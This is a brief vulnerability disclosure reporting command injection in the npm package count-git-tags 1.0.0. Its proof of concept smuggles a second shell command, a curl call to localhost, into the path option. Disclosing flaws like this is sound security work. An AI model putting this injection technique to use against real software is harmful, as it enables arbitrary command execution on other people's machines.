## Details:
I would like to report a `RCE` issue in the `count-git-tags` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

## Module
* **module name:** `count-git-tags`
* **version:** `1.0.0`
* **npm page:** `https://www.npmjs.com/package/count-git-tags`

## Module Description
> A tool to count the number of tags of a git repository

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/aichbauer/node-count-git-tags/blob/master/index.js#L27

## POC

```js
// poc.js
const countGitTags = require('count-git-tags');
 
countGitTags({ path: '.git;curl "http://localhost/RCE"' });
```

## Impact

`RCE` on `count-git-tags` via `insecure command formatting`
